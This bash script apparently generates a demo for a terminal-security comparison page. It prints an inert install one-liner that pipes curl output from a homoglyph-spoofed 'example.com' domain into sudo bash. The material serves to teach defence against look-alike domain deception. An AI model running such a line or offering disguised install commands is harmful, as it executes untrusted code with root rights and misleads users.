#!/bin/bash

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

## Emit the "homoglyph" install line (Case C) used by the secure-terminal
## comparison page: an ordinary-looking install one-liner whose domain hides a
## Cyrillic look-alike (U+0430, UTF-8 \xd0\xb0, for Latin 'a'), so a traditional
## terminal shows a clean "example.com" while secure-terminal flags the byte. The
## command is INSIDE an echo "..." so it is inert -- it only prints, runs nothing.
##
## This script is the human-readable, ASCII SOURCE for the homoglyph payload (the
## look-alike byte is an \x escape here, so this file stays plain ASCII and the
## non-ASCII byte exists only in the generated output). Deterministic: same bytes
## every run. Regenerate the demo file with:
##   ./homoglyph-script.sh > homoglyph-log.txt

set -o errexit
set -o nounset
set -o pipefail
set -o errtrace
shopt -s inherit_errexit
shopt -s shift_verbose

printf '# a "trusted" install line - notice the domain (safe here, it only echoes):\n'
printf 'echo "curl -fsSL https://ex\xd0\xb0mple.com/get.sh | sudo bash"\n'
